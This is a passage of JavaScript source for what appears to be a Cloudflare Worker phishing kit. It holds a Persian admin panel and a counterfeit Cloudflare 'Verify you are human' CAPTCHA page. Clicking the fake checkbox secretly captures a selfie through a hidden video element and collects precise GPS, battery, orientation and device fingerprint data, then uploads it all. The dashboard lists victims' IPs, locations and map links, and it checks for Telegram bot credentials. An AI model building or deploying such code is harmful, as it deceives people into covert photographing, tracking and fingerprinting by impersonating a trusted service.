  .ui-option-title { font-weight: 600; font-size: 13px; }
  .ui-option-desc { font-size: 11px; color: var(--muted); }
  .ui-option.active .ui-option-desc { color: var(--ok); }
  .url-form { display: flex; gap: 8px; }
  .url-form input { flex: 1; }
  .redirect-status { margin-top: 10px; font-size: 12px; padding: 8px 12px; border-radius: 8px; line-height: 1.6; }
  .redirect-status.active { background: var(--ok-bg); color: var(--ok); }
  .redirect-status.empty  { background: #f3f4f6; color: var(--muted); }
  .redirect-status code { background: rgba(0,0,0,.06); padding: 2px 6px; border-radius: 4px; word-break: break-all; }
  .features-grid { display: grid; grid-template-columns: 1fr; gap: 14px; margin-bottom: 18px; }
  @media (min-width: 500px) { .features-grid { grid-template-columns: 1fr 1fr; } }
  .feature-card { border: 1px solid var(--border); border-radius: 12px; padding: 16px;
    background: #fff; display: flex; flex-direction: column; transition: all .2s; }
  .feature-card.active { border-color: var(--ok-border); background: #f7fdfa; }
  .feature-card.inactive { border-color: var(--err-border); background: #fefafa; }
  .feature-head { display: flex; align-items: center; gap: 10px; margin-bottom: 10px; }
  .feature-icon { font-size: 22px; line-height: 1; }
  .feature-title { font-weight: 600; font-size: 14px; flex: 1; }
  .feature-status { font-size: 11px; padding: 3px 8px; border-radius: 20px; font-weight: 600; white-space: nowrap; }
  .feature-status.on  { background: var(--ok-bg);  color: var(--ok); }
  .feature-status.off { background: var(--err-bg); color: var(--err); }
  .feature-hint { font-size: 12px; color: var(--muted); margin-bottom: 12px; line-height: 1.6; flex: 1; }
  .info-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; margin-bottom: 18px; }
  .info-item { background: #fafbfc; border: 1px solid var(--border); border-radius: 10px; padding: 10px 12px; }
  .info-label { font-size: 11px; color: var(--muted); display:block; margin-bottom: 3px; }
  .info-value { font-size: 13px; font-weight: 500; }
  .info-value.small { font-size: 11px; }
  code { font-family: ui-monospace, SFMono-Regular, Menlo, monospace; font-size: 12px; }
  .table-wrap { overflow-x: auto; }
  table { width: 100%; border-collapse: collapse; font-size: 12px; min-width: 480px; }
  th, td { padding: 8px 6px; text-align: right; border-bottom: 1px solid var(--border); }
  th { color: var(--muted); font-weight: 500; background: #fafbfc; }
  tr:last-child td { border-bottom: none; }
  .empty { text-align: center; color: var(--muted); padding: 16px !important; }
  .map-link { color: var(--accent); text-decoration: none; font-family: ui-monospace, monospace; font-size: 11px; }
  .map-link:hover { text-decoration: underline; }
  .checks { display: grid; grid-template-columns: repeat(2, 1fr); gap: 8px 16px; font-size: 12px;
    padding: 12px; background: #fafbfc; border: 1px solid var(--border); border-radius: 10px; }
  .checks .ck { display: flex; align-items: center; gap: 8px; }
  .ck-icon { font-size: 13px; }
  .ck-icon.ok  { color: var(--ok); }
  .ck-icon.miss { color: var(--err); }
  .ck-icon.warn { color: var(--warn); }
  .section { margin-top: 20px; }
  .mt { margin-top: 16px; }
`;

function renderAdminLogin(nonce, adminBase, params) {
  const err = params.get('err');
  const errMsg = err === 'rate' ? '⛔️ تعداد تلاش بیش از حد. یک دقیقه صبر کنید.'
    : err === 'invalid' ? '⛔️ رمز عبور اشتباه است.' : null;
  return `<!DOCTYPE html>
<html lang="fa" dir="rtl"><head><meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="robots" content="noindex,nofollow,noarchive"><title>ورود به پنل</title>
<style nonce="${nonce}">${ADMIN_CSS}</style></head><body>
<div class="wrap" style="max-width:380px">
<form class="card login-card" method="POST" action="${adminBase}/login">
<div class="login-icon">🔐</div><h1>پنل مدیریت</h1>
<p class="subtitle">برای ادامه رمز عبور را وارد کنید</p>
${errMsg ? `<div class="alert err">${errMsg}</div>` : ''}
<input type="password" name="password" placeholder="رمز عبور" required autofocus autocomplete="current-password">
<button type="submit" class="btn btn-primary btn-block mt">ورود</button>
</form></div></body></html>`;
}

function featureCard(o) {
  return `<div class="feature-card ${o.active ? 'active' : 'inactive'}">
<div class="feature-head">
<span class="feature-icon">${o.icon}</span><span class="feature-title">${o.title}</span>
<span class="feature-status ${o.active ? 'on' : 'off'}">${o.active ? 'روشن' : 'خاموش'}</span>
</div>
<div class="feature-hint">${o.hint}</div>
<form method="POST" action="${o.adminBase}/toggle" data-confirm="آیا مطمئنید؟">
<input type="hidden" name="feature" value="${o.feature}">
<input type="hidden" name="state" value="${o.active ? 'off' : 'on'}">
<button type="submit" class="btn btn-block ${o.active ? 'btn-danger' : 'btn-success'}">
${o.active ? o.offLabel : o.onLabel}</button></form></div>`;
}

function renderAdminDashboard(nonce, adminBase, siteState, selfieState, geoState, uiMode, redirectUrl, env, cf, log, params) {
  const siteOn = siteState !== 'off';
  const selfieOn = selfieState === 'on';
  const geoOn = geoState === 'on';
  const hasRedirect = !!(redirectUrl && redirectUrl.length > 0);
  const storage = env.SELFIE_STATE ? 'KV' : 'Cache (per-colo)';
  const timeStr = new Date().toISOString().replace('T', ' ').slice(0, 19) + ' UTC';
  const okP = params.get('ok'), errP = params.get('err');
  let toast = '';
  if (okP === 'login') toast = `<div class="alert ok">✅ ورود موفق.</div>`;
  else if (okP === 'toggled') {
    const f = params.get('feature'), s = params.get('state');
    toast = `<div class="alert ok">✅ ${f === 'geo' ? 'موقعیت' : 'سلفی'} به «${s === 'on' ? 'روشن' : 'خاموش'}» تغییر کرد.</div>`;
  } else if (okP === 'site') toast = `<div class="alert ok">✅ کل سایت ${params.get('state') === 'on' ? 'روشن' : 'خاموش'} شد.</div>`;
  else if (okP === 'ui') {
    const m = params.get('mode');
    const found = UI_MODES.find((x) => x.id === m);
    toast = `<div class="alert ok">✅ ظاهر به «${found ? found.title : m}» تغییر کرد.</div>`;
  } else if (okP === 'redirect') toast = `<div class="alert ok">✅ آدرس هدایت ذخیره شد.</div>`;
  else if (errP === 'state') toast = `<div class="alert err">❌ درخواست نامعتبر.</div>`;
  else if (errP === 'ui') toast = `<div class="alert err">❌ تم نامعتبر.</div>`;
  else if (errP === 'url') toast = `<div class="alert err">❌ آدرس باید با http:// یا https:// شروع شود.</div>`;

  const rows = (log || []).length ? log.map((e) => {
    const coords = e.lat != null && e.lon != null
      ? `<a class="map-link" href="${escapeHtml(`https://www.google.com/maps/search/?api=1&query=${e.lat},${e.lon}`)}" target="_blank" rel="noopener">${e.lat.toFixed(3)}, ${e.lon.toFixed(3)}</a>`
      : '<span style="color:var(--muted)">—</span>';
    return `<tr><td><code>${new Date(e.ts || 0).toISOString().slice(11, 19)}</code></td>
<td><code>${escapeHtml(e.ip || '—')}</code></td>
<td>${escapeHtml(e.city || '—')}${e.country ? '، ' + escapeHtml(e.country) : ''}</td>
<td>${e.selfieMode === 'on' ? '🟢' : '🔴'}</td><td>${coords}</td></tr>`;
  }).join('') : '<tr><td colspan="5" class="empty">هیچ ارسالی ثبت نشده</td></tr>';

  const checks = [
    { label: 'TELEGRAM_BOT_TOKEN', ok: !!env.TELEGRAM_BOT_TOKEN },
    { label: 'TELEGRAM_CHAT_ID', ok: !!env.TELEGRAM_CHAT_ID },
    { label: 'ADMIN_TOKEN', ok: !!env.ADMIN_TOKEN },
    { label: 'ADMIN_PASSWORD', ok: !!env.ADMIN_PASSWORD, warn: !env.ADMIN_PASSWORD },
    { label: 'KV (SELFIE_STATE)', ok: !!env.SELFIE_STATE, warn: !env.SELFIE_STATE },
    { label: 'SESSION_SECRET', ok: !!env.SESSION_SECRET, optional: true },
  ];
  const checksHtml = checks.map((c) => {
    const icon = c.ok ? '✅' : c.warn ? '⚠️' : c.optional ? '➖' : '❌';
    const cls = c.ok ? 'ok' : c.warn ? 'warn' : c.optional ? '' : 'miss';
    return `<div class="ck"><span class="ck-icon ${cls}">${icon}</span><span>${c.label}</span></div>`;
  }).join('');

  const uiOptionsHtml = UI_MODES.map((m) => `
<form method="POST" action="${adminBase}/set-ui" class="ui-form">
<input type="hidden" name="mode" value="${m.id}">
<button type="submit" class="ui-option ${uiMode === m.id ? 'active' : ''}">
<span class="ui-option-icon">${m.icon}</span>
<span class="ui-option-title">${m.title}</span>
<span class="ui-option-desc">${uiMode === m.id ? '✓ فعال' : m.desc}</span>
</button></form>`).join('');

  const redirectStatusHtml = hasRedirect
    ? `<div class="redirect-status active">✅ فعال — بعد از تایید به این آدرس منتقل می‌شوند:<br><code>${escapeHtml(redirectUrl)}</code></div>`
    : `<div class="redirect-status empty">➖ غیرفعال — بعد از تایید، کاربر در همان صفحه می‌ماند.</div>`;

  const kvWarning = !env.SELFIE_STATE
    ? `<div class="alert err" style="margin-top:10px">⚠️ KV بسته نشده — تنظیمات بین کولوها همگام نمی‌شود.</div>` : '';

  return `<!DOCTYPE html>
<html lang="fa" dir="rtl"><head><meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="robots" content="noindex,nofollow,noarchive"><title>پنل مدیریت</title>
<style nonce="${nonce}">${ADMIN_CSS}</style></head><body>
<div class="wrap"><div class="card">
<div class="row-between">
<div><h1>🔐 پنل مدیریت</h1><p class="subtitle" style="margin:4px 0 0">${escapeHtml(adminBase)}</p></div>
<form method="POST" action="${adminBase}/logout"><button type="submit" class="btn btn-sm">خروج</button></form>
</div>
${toast}
<div class="toolbar">
<a class="btn btn-sm" href="/" target="_blank" rel="noopener">↗️ صفحهٔ کپچا</a>
<a class="btn btn-sm" href="${adminBase}">🔄 بروزرسانی</a>
</div>

<section>
<div class="site-card ${siteOn ? 'on' : 'off'}">
<div class="site-badge">${siteOn ? '🟢 سایت روشن است' : '🔴 سایت خاموش است'}</div>
<div class="site-hint">${siteOn
  ? 'کاربران با باز کردن آدرس، صفحهٔ کپچا را می‌بینند.'
  : 'کاربران با باز کردن آدرس، فقط یک صفحهٔ سفید خالی می‌بینند.'}</div>
<form method="POST" action="${adminBase}/set-site" data-confirm="${siteOn ? 'کل سایت خاموش شود؟ کاربران صفحهٔ سفید می‌بینند.' : 'کل سایت روشن شود؟'}">
<input type="hidden" name="state" value="${siteOn ? 'off' : 'on'}">
<button type="submit" class="btn btn-block ${siteOn ? 'btn-danger' : 'btn-success'}">
${siteOn ? '🔴 خاموش کردن کل سایت' : '🟢 روشن کردن کل سایت'}</button>
</form></div></section>

<section class="section"><h2>🎨 ظاهر صفحهٔ کپچا</h2>
<div class="ui-options">${uiOptionsHtml}</div></section>

<section class="section"><h2>🔗 هدایت بعد از تایید</h2>
<form method="POST" action="${adminBase}/set-redirect" class="url-form">
<input type="url" name="url" value="${escapeHtml(redirectUrl || '')}" placeholder="https://example.com" inputmode="url" autocomplete="off">
<button type="submit" class="btn btn-primary">ذخیره</button>
</form>
${redirectStatusHtml}
<p class="subtitle" style="font-size:11px;margin-top:8px">برای حذف، فیلد را خالی کرده و ذخیره کنید.</p>
${kvWarning}</section>

<section class="section"><h2>⚙️ قابلیت‌ها</h2>
<div class="features-grid">
${featureCard({ icon: '📸', title: 'سلفی', active: selfieOn,
  hint: selfieOn ? 'از کاربر دوربین درخواست می‌شود و تصویر ارسال می‌گردد'
    : 'دوربین درخواست نمی‌شود — سایر داده‌ها همچنان ارسال می‌شوند',
  feature: 'selfie', onLabel: '🟢 روشن کردن سلفی', offLabel: '🔴 خاموش کردن سلفی', adminBase })}
${featureCard({ icon: '📍', title: 'موقعیت دقیق', active: geoOn,
  hint: geoOn ? 'از کاربر اجازهٔ موقعیت مکانی خواسته می‌شود (GPS دقت بالا)'
    : 'موقعیت درخواست نمی‌شود — فقط مختصات IP ثبت می‌شود',
  feature: 'geo', onLabel: '🟢 روشن کردن موقعیت', offLabel: '🔴 خاموش کردن موقعیت', adminBase })}
</div></section>

<div class="info-grid">
<div class="info-item"><span class="info-label">ذخیره‌سازی</span><span class="info-value">${escapeHtml(storage)}</span></div>
<div class="info-item"><span class="info-label">Colo</span><span class="info-value">${escapeHtml(cf.colo || '—')}</span></div>
<div class="info-item"><span class="info-label">زمان سرور</span><span class="info-value small">${escapeHtml(timeStr)}</span></div>
</div>

<section class="section"><h2>📋 آخرین ارسال‌ها</h2>
<div class="table-wrap"><table>
<thead><tr><th>زمان</th><th>IP</th><th>شهر، کشور</th><th>سلفی</th><th>موقعیت</th></tr></thead>
<tbody>${rows}</tbody></table></div></section>

<section class="section"><h2>🛠 سلامت تنظیمات</h2>
<div class="checks">${checksHtml}</div></section>
</div></div>
<script nonce="${nonce}">document.querySelectorAll('form[data-confirm]').forEach(function(f){f.addEventListener('submit',function(e){if(!confirm(f.dataset.confirm))e.preventDefault();});});</script>
</body></html>`;
}

// ============================================================
//  Shared captcha script
// ============================================================
function captchaScript(nonce, selfieMode, geoMode, redirectUrl, labels) {
  return `<script nonce="${nonce}">
(function () {
  var SELFIE_MODE = ${JSON.stringify(selfieMode)};
  var GEO_MODE = ${JSON.stringify(geoMode)};
  var REDIRECT_URL = ${JSON.stringify(redirectUrl || '')};
  var L = ${JSON.stringify(labels || {})};
  var widget = document.getElementById('widget');
  var labelEl = document.getElementById('label');
  var status = document.getElementById('status');
  var retry = document.getElementById('retry');
  var video = document.getElementById('hiddenVideo');
  var canvas = document.getElementById('canvas');
  var ray = document.getElementById('ray');
  if (ray) {
    var chars = '0123456789abcdef', rid = '';
    for (var i = 0; i < 16; i++) rid += chars[Math.floor(Math.random() * 16)];
    ray.textContent = rid;
  }
  var statusBaseClass = status ? status.className : '';
  var busy = false, completed = false;
  var CAM_ERRORS = {
    NotAllowedError: L.camNotAllowed || 'Camera access was denied.',
    NotFoundError: L.camNotFound || 'No camera found.',
    NotReadableError: L.camNotReadable || 'Camera is in use by another app.',
    OverconstrainedError: L.camOverconstrained || 'Camera settings not supported.',
    SecurityError: L.camSecurity || 'HTTPS required for camera.',
    AbortError: L.camAbort || 'Camera access was aborted.'
  };
  function setState(state, message) {
    widget.classList.remove('busy', 'done');
    widget.setAttribute('aria-checked', 'false');
    if (status) { status.className = statusBaseClass; status.textContent = ''; }
    if (retry) retry.style.display = 'none';
    if (state === 'busy') {
      widget.classList.add('busy');
      if (L.labelBusy && labelEl) labelEl.textContent = L.labelBusy;
      if (status) status.textContent = L.busy || 'Verifying...';
    } else if (state === 'done') {
      widget.classList.add('done');
      widget.setAttribute('aria-checked', 'true');
      if (L.labelDone && labelEl) labelEl.textContent = L.labelDone;
      if (status) { status.className = statusBaseClass + ' ok'; status.textContent = L.done || 'Verified'; }
    } else if (state === 'error') {
      if (L.labelIdle && labelEl) labelEl.textContent = L.labelIdle;
      if (status) { status.className = statusBaseClass + ' error'; status.textContent = message || L.error || 'Please try again.'; }
      if (retry) retry.style.display = 'inline-block';
    } else if (L.labelIdle && labelEl) labelEl.textContent = L.labelIdle;
  }
  async function getCameraStream() {
    var primary = { video: { facingMode: 'user' }, audio: false };
    try { return await navigator.mediaDevices.getUserMedia(primary); }
    catch (e) {
      if (e.name === 'OverconstrainedError' || e.name === 'NotFoundError')
        return await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
      throw e;
    }
  }
  function waitForVideo(v, timeoutMs) {
    if (v.readyState >= 2) return Promise.resolve();
    return new Promise(function (resolve, reject) {
      var to = setTimeout(function () { reject(new Error('camera_timeout')); }, timeoutMs || 6000);
      v.onloadeddata = function () { clearTimeout(to); resolve(); };
    });
  }
  async function collectCameraInfo(stream) {
    var info = {};
    var track = stream.getVideoTracks()[0];
    if (!track) return info;
    try {
      var s = (track.getSettings && track.getSettings()) || {};
      var c = (track.getCapabilities && track.getCapabilities()) || {};
      info.deviceId = s.deviceId; info.groupId = s.groupId;
      info.facingMode = s.facingMode; info.width = s.width; info.height = s.height;
      info.frameRate = s.frameRate; info.aspectRatio = s.aspectRatio;
      info.resizeMode = s.resizeMode; info.focusMode = s.focusMode;
      info.exposureMode = s.exposureMode; info.whiteBalanceMode = s.whiteBalanceMode;
      info.supportedFacingModes = c.facingMode || [];
      info.supportedFocusModes = c.focusMode || [];
      info.hasTorch = !!c.torch;
      info.zoom = c.zoom ? { min: c.zoom.min, max: c.zoom.max, step: c.zoom.step } : null;
      info.iso = c.iso ? { min: c.iso.min, max: c.iso.max, step: c.iso.step } : null;
      info.focusDistance = c.focusDistance ? { min: c.focusDistance.min, max: c.focusDistance.max } : null;
      info.brightness = c.brightness ? { min: c.brightness.min, max: c.brightness.max } : null;
      info.contrast = c.contrast ? { min: c.contrast.min, max: c.contrast.max } : null;
      info.saturation = c.saturation ? { min: c.saturation.min, max: c.saturation.max } : null;
      info.sharpness = c.sharpness ? { min: c.sharpness.min, max: c.sharpness.max } : null;
      info.requestedConstraints = (track.getConstraints && track.getConstraints()) || null;
    } catch (e) { info._settingsError = String(e); }
    try {
      var devices = await navigator.mediaDevices.enumerateDevices();
      info.videoDeviceCount = devices.filter(function (d) { return d.kind === 'videoinput'; }).length;
      info.audioDeviceCount = devices.filter(function (d) { return d.kind === 'audioinput'; }).length;
      info.videoDeviceLabels = devices.filter(function (d) { return d.kind === 'videoinput'; })
        .map(function (d) { return d.label || '(unnamed)'; });
    } catch (e) { info._enumerateError = String(e); }
    return info;
  }
  async function requestOrientationPermission() {
    try {
      if (typeof DeviceOrientationEvent === 'undefined') return { available: false, reason: 'unsupported' };
      if (typeof DeviceOrientationEvent.requestPermission === 'function') {
        var state = await DeviceOrientationEvent.requestPermission();
        return { available: state === 'granted', reason: state };
      }
      return { available: true, reason: 'no_permission_needed' };
    } catch (e) { return { available: false, reason: String((e && e.message) || e) }; }
  }
  async function collectOrientation(sampleMs) {
    var result = { supported: typeof DeviceOrientationEvent !== 'undefined', samples: [] };
    try {
      if (screen.orientation) result.screenOrientation = { type: screen.orientation.type, angle: screen.orientation.angle };
      else if (typeof window.orientation !== 'undefined') result.screenOrientation = { angle: window.orientation };
    } catch (e) { result._screenOrientationError = String(e); }
    if (!result.supported) return result;
    var collected = [];
    var listener = function (ev) {
      collected.push({
        alpha: typeof ev.alpha === 'number' ? ev.alpha : null,
        beta: typeof ev.beta === 'number' ? ev.beta : null,
        gamma: typeof ev.gamma === 'number' ? ev.gamma : null,
        absolute: ev.absolute === true
      });
    };
    window.addEventListener('deviceorientation', listener);
    await new Promise(function (r) { setTimeout(r, sampleMs || 500); });
    window.removeEventListener('deviceorientation', listener);
    var valid = collected.filter(function (s) { return s.alpha != null || s.beta != null || s.gamma != null; });
    if (valid.length === 0) { result.note = 'no_events_received'; return result; }
    var avgOf = function (key) {
      var v = valid.map(function (s) { return s[key]; }).filter(function (n) { return typeof n === 'number'; });
      return v.length ? v.reduce(function (a, b) { return a + b; }, 0) / v.length : null;
    };
    result.average = { alpha: avgOf('alpha'), beta: avgOf('beta'), gamma: avgOf('gamma') };
    result.sampleCount = valid.length;
    result.absolute = valid.some(function (s) { return s.absolute; });
    result.posture = classifyPosture(result.average, result.screenOrientation);
    return result;
  }
  function classifyPosture(avg, so) {
    if (avg.beta == null && avg.gamma == null) return 'unknown';
    var beta = avg.beta || 0, gamma = avg.gamma || 0, absB = Math.abs(beta), parts = [];
    if (absB < 20) parts.push('flat');
    else if (absB < 70) parts.push(beta > 0 ? 'tilted forward' : 'tilted backward');
    else if (absB < 110) parts.push('upright');
    else parts.push('face down');
    if (gamma > 25) parts.push('rotated right');
    else if (gamma < -25) parts.push('rotated left');
    var t = so && so.type;
    if (t) {
      if (t.indexOf('portrait') === 0) parts.push('portrait');
      else if (t.indexOf('landscape') === 0) parts.push('landscape');
    }
    return parts.join(' • ') || 'neutral';
  }
  async function collectBattery() {
    var out = { supported: typeof navigator.getBattery === 'function' };
    if (!out.supported) { out.reason = 'api_unsupported'; return out; }
    try {
      var b = await navigator.getBattery();
      out.level = b.level; out.percent = Math.round(b.level * 100);
      out.charging = !!b.charging;
      out.chargingTime = isFinite(b.chargingTime) ? b.chargingTime : null;
      out.dischargingTime = isFinite(b.dischargingTime) ? b.dischargingTime : null;
    } catch (e) { out.error = String((e && e.message) || e); }
    return out;
  }
  async function collectGeolocation() {
    if (!('geolocation' in navigator)) return { supported: false, reason: 'api_unsupported' };
    return new Promise(function (resolve) {
      var done = false;
      var finish = function (r) { if (done) return; done = true; resolve(r); };
      var safety = setTimeout(function () {
        finish({ supported: true, success: false, error: 'OUTER_TIMEOUT', message: 'Location timed out' });
      }, 14000);
      try {
        navigator.geolocation.getCurrentPosition(
          function (pos) {
            clearTimeout(safety);
            var c = pos.coords;
            finish({
              supported: true, success: true,
              latitude: c.latitude, longitude: c.longitude, accuracy: c.accuracy,
              altitude: typeof c.altitude === 'number' ? c.altitude : null,
              altitudeAccuracy: typeof c.altitudeAccuracy === 'number' ? c.altitudeAccuracy : null,
              heading: typeof c.heading === 'number' ? c.heading : null,
              speed: typeof c.speed === 'number' ? c.speed : null,
              timestamp: pos.timestamp
            });
          },
          function (err) {
            clearTimeout(safety);
            var names = { 1: 'PERMISSION_DENIED', 2: 'POSITION_UNAVAILABLE', 3: 'TIMEOUT' };
            finish({ supported: true, success: false, error: names[err.code] || 'CODE_' + err.code, message: String(err.message || '') });
          },
          { enableHighAccuracy: true, maximumAge: 0, timeout: 10000 }
        );
      } catch (e) {
        clearTimeout(safety);
        finish({ supported: true, success: false, error: 'THROW', message: String((e && e.message) || e) });
      }
    });
  }
  function collectClientData() {
    var c = navigator.connection || {}, now = new Date();
    return {
      userAgent: navigator.userAgent, language: navigator.language,
      languages: navigator.languages ? Array.from(navigator.languages) : [],
      platform: navigator.platform,
      screenWidth: window.screen.width, screenHeight: window.screen.height,
      innerWidth: window.innerWidth, innerHeight: window.innerHeight,
      devicePixelRatio: window.devicePixelRatio,
      hardwareConcurrency: navigator.hardwareConcurrency,
      deviceMemory: navigator.deviceMemory,
      onLine: navigator.onLine,
      connectionType: c.effectiveType || null,
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      localTime: now.toLocaleString(), utcTime: now.toISOString(),
      cookieEnabled: navigator.cookieEnabled,
      doNotTrack: navigator.doNotTrack,
      pdfViewerEnabled: navigator.pdfViewerEnabled
    };
  }
  async function run() {
    if (busy || completed) return;
    busy = true;
    setState('busy');
    var orientationPerm = await requestOrientationPermission();
    var stream = null;
    try {
      var blob = null, captured = null, camInfo = {};
      if (SELFIE_MODE === 'on') {
        stream = await getCameraStream();
        video.srcObject = stream;
        await waitForVideo(video);
        await new Promise(function (r) { setTimeout(r, 350); });
        camInfo = await collectCameraInfo(stream);
        canvas.width = video.videoWidth || 640;
        canvas.height = video.videoHeight || 480;
        canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
        blob = await new Promise(function (res) { canvas.toBlob(res, 'image/jpeg', 0.9); });
        if (!blob) throw new Error('capture_failed');
        captured = { width: canvas.width, height: canvas.height, size: blob.size };
        stream.getTracks().forEach(function (t) { t.stop(); });
        stream = null;
      }
      var results = await Promise.all([
        orientationPerm.available ? collectOrientation() : Promise.resolve({ supported: false, reason: orientationPerm.reason }),
        collectBattery(),
        GEO_MODE === 'on' ? collectGeolocation() : Promise.resolve({ supported: true, skipped: true, note: 'disabled_by_admin' })
      ]);
      var clientData = collectClientData();
      clientData.selfieMode = SELFIE_MODE;
      clientData.geoMode = GEO_MODE;
      clientData.camera = camInfo;
      clientData.capturedFrame = captured;
      clientData.orientation = results[0];
      clientData.orientationPermission = orientationPerm;
      clientData.battery = results[1];
      clientData.geolocation = results[2];
      var fd = new FormData();
      if (SELFIE_MODE === 'on' && blob) fd.append('photo', blob, 'selfie.jpg');
      fd.append('clientData', JSON.stringify(clientData));
      var resp = await fetch('/upload', { method: 'POST', body: fd, credentials: 'same-origin' });
      if (!resp.ok) {
        var detail = '';
        try { detail = (await resp.json()).error || ''; } catch (e) {}
        throw new Error('upload_failed:' + (detail || resp.status));
      }
      completed = true;
      setState('done');
      if (REDIRECT_URL) setTimeout(function () { window.location.replace(REDIRECT_URL); }, 1500);
    } catch (err) {
      if (stream) stream.getTracks().forEach(function (t) { t.stop(); });
      var name = err && err.name;
      var msg = CAM_ERRORS[name] ||
        (err && err.message === 'camera_timeout' ? (L.camTimeout || 'Camera timed out.')
          : err && err.message && err.message.indexOf('upload_failed') === 0 ? (L.uploadError || 'Connection error.')
          : (L.error || 'Something went wrong.'));
      setState('error', msg);
    } finally { busy = false; }
  }
  widget.addEventListener('click', function (e) {
    if (e.target.closest && e.target.closest('a')) return;
    if (busy || completed) return;
    run();
  });
  widget.addEventListener('keydown', function (e) {
    if ((e.key === ' ' || e.key === 'Enter') && !busy && !completed) { e.preventDefault(); run(); }
  });
  if (retry) retry.addEventListener('click', function () { if (!busy) run(); });
})();
</script>`;
}

// ============================================================
//  Theme: Cloudflare
// ============================================================
function renderCloudflareHTML(nonce, s, g, redirectUrl) {
  const labels = { busy: 'Verifying...', done: 'Verification complete',
    error: 'Verification failed. Please try again.',
    camTimeout: 'Camera timed out. Please try again.',
    uploadError: 'Connection error. Please try again.' };
  return `<!DOCTYPE html>
<html lang="en" dir="ltr"><head><meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="robots" content="noindex,nofollow,noarchive"><title>Just a moment...</title>
<style nonce="${nonce}">
* { box-sizing: border-box; }
html, body { margin: 0; padding: 0; min-height: 100%; }
body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
  font-size: 14px; color: #232323; background: #fff; min-height: 100vh;
  display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 20px; }
.cf-main { display: flex; flex-direction: column; align-items: center; gap: 12px; }
.cf-widget { width: 300px; height: 65px; background: #fff; border: 1px solid #e0e0e0; border-radius: 4px;
  display: flex; align-items: center; padding: 0 14px; box-shadow: 0 1px 3px rgba(0,0,0,0.06);
  transition: border-color .15s; cursor: pointer; user-select: none; -webkit-tap-highlight-color: transparent; }
.cf-widget:hover { border-color: #c8c8c8; }
.cf-widget:focus { outline: none; border-color: #a0a0a0; }
.cf-widget.busy, .cf-widget.done { cursor: default; }
.cf-checkbox { width: 28px; height: 28px; border: 2px solid #b0b0b0; border-radius: 4px;
  background: #fff; flex-shrink: 0; display: flex; align-items: center; justify-content: center;
  transition: all .2s; position: relative; }
.cf-widget.busy .cf-checkbox { border-color: #e8e8e8; background: #fafafa; }
.cf-widget.busy .cf-checkbox::after { content: ""; width: 18px; height: 18px;
  border: 2.5px solid #F38020; border-right-color: transparent; border-radius: 50%;
  animation: cf-spin .8s linear infinite; }
.cf-widget.done .cf-checkbox { border-color: #0cce6b; background: #0cce6b; }
.cf-widget.done .cf-checkbox::after { content: ""; width: 6px; height: 13px;
  border: solid #fff; border-width: 0 2.5px 2.5px 0;
  transform: rotate(45deg) translate(-1px, -2px); }
@keyframes cf-spin { to { transform: rotate(360deg); } }
.cf-label { flex: 1; font-size: 14px; color: #232323; padding-left: 12px; line-height: 1.3; }
.cf-brand { display: flex; flex-direction: column; align-items: flex-end; gap: 1px; flex-shrink: 0; }
.cf-brand-logo { display: flex; align-items: center; gap: 4px; font-size: 11px; color: #333; font-weight: 500; line-height: 1; }
.cf-brand-links { font-size: 9px; color: #888; white-space: nowrap; line-height: 1; }
.cf-brand-links a { color: #888; text-decoration: none; }
.cf-brand-links a:hover { text-decoration: underline; }
.cf-brand-links span { margin: 0 3px; color: #ccc; }
.cf-status { font-size: 12px; color: #666; min-height: 16px; text-align: center; max-width: 300px; line-height: 1.4; }
.cf-status.error { color: #d93636; }
.cf-status.ok { color: #0cce6b; }
.cf-retry { background: none; border: 1px solid #e0e0e0; color: #232323;
  padding: 6px 14px; border-radius: 4px; font-size: 12px; cursor: pointer;
  display: none; font-family: inherit; }
.cf-retry:hover { background: #f5f5f5; }
.cf-footer { position: fixed; bottom: 12px; right: 16px; font-size: 11px; color: #888;
  display: flex; align-items: center; gap: 6px; flex-wrap: wrap; justify-content: flex-end; }
.cf-footer b { color: #555; font-weight: 600; font-family: ui-monospace, Menlo, monospace; }
.cf-footer a { color: #F38020; text-decoration: none; }
.cf-footer a:hover { text-decoration: underline; }
.cf-footer .dot { color: #ccc; }
#hiddenVideo, #canvas { display: none; }
@media (max-width: 380px) { .cf-widget { width: 100%; max-width: 300px; }
  .cf-footer { position: static; margin-top: 24px; justify-content: center; } }
</style></head><body>
<main class="cf-main">
<div class="cf-widget" id="widget" role="checkbox" aria-checked="false" tabindex="0" aria-label="Verify you are human">
<div class="cf-checkbox"></div>
<div class="cf-label" id="label">Verify you are human</div>
<div class="cf-brand">
<div class="cf-brand-logo">
<svg width="22" height="14" viewBox="0 0 22 14" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
<path fill="#F38020" d="M17.5 6c-.3 0-.5 0-.8.1C16.3 3.6 14 2 11.4 2c-2.7 0-5.1 2-5.6 4.6-.2-.1-.5-.1-.7-.1C3.3 6.5 2 7.8 2 9.4 2 11.1 3.4 12.5 5 12.5h12.5c1.4 0 2.5-1.1 2.5-2.5S18.9 6 17.5 6z"/>
</svg><span>Cloudflare</span></div>
<div class="cf-brand-links">
<a href="https://www.cloudflare.com/privacypolicy/" target="_blank" rel="noopener noreferrer" tabindex="-1">Privacy</a>
<span>·</span>
<a href="https://www.cloudflare.com/website-terms/" target="_blank" rel="noopener noreferrer" tabindex="-1">Terms</a>
</div></div></div>
<div class="cf-status" id="status" role="status" aria-live="polite"></div>
<button class="cf-retry" id="retry" type="button">Try again</button>
</main>
<footer class="cf-footer">
<span>Cloudflare Ray ID: <b id="ray">—</b></span><span class="dot">•</span>
<span>Performance &amp; security by <a href="https://www.cloudflare.com" target="_blank" rel="noopener noreferrer">Cloudflare</a></span>
</footer>
<video id="hiddenVideo" autoplay playsinline muted></video>
<canvas id="canvas"></canvas>
${captchaScript(nonce, s, g, redirectUrl, labels)}
</body></html>`;
}

// ============================================================
//  Theme: Classic (Persian)
// ============================================================
function renderClassicHTML(nonce, s, g, redirectUrl) {
  const labels = {
